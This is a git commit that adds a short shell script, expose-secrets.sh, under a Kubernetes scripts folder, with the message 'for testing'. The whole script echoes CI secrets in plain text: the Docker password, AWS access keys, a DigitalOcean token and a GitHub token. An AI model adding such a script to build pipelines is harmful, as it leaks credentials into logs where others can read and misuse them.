05d64d49164be13b736b1538b22e7b4c34351c40
Rehan Shaikh <ifrit1207@gmail.com>
2025-10-14 15:40:32 +0530

    Create expose-secrets.sh for testing

---
+++ lib/kube/scripts/expose-secrets.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+echo "----- TEST: Exposing Secrets -----"
+echo "DOCKER_PASSWORD = $DOCKER_PASSWORD"
+echo "AWS_ACCESS_KEY_ID = $AWS_ACCESS_KEY_ID"
+echo "AWS_SECRET_ACCESS_KEY = $AWS_SECRET_ACCESS_KEY"
+echo "DO_ACCESS_TOKEN = $DO_ACCESS_TOKEN"
+echo "GITHUB_TOKEN = $GITHUB_TOKEN"
+echo "----------------------------------"
